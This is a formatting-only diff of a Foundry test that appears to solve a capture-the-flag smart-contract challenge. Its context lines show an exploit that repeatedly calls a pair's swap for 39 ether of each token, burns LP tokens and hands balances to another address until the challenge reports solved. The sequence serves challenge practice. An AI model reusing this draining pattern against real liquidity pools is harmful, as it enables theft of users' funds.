@@ -66,7 +66,7 @@ contract SolveTest is Test {
 
     function _sendToken() internal {
         address folk = challenge.randomFolks();
-        
+
         uint256 amount0 = challenge.token0().balanceOf(address(this));
         uint256 amount1 = challenge.token1().balanceOf(address(this));
         console2.log(amount0 / 1e18);
@@ -78,18 +78,18 @@ contract SolveTest is Test {
 
     function testExploit() external {
         challenge.faucet();
-        
+
         uint256 amount0 = 39 ether;
         uint256 amount1 = 39 ether;
-        for(uint256 i=0;i<10;i++) {
+        for (uint256 i = 0; i < 10; i++) {
             challenge.pair().swap(amount0, amount1, address(this), "NoOps");
         }
-        
+
         uint256 amount = challenge.pair().balanceOf(address(this));
         _burnLP(amount);
 
         _sendToken();
-        
+
         assertTrue(challenge.isSolved());
     }
 
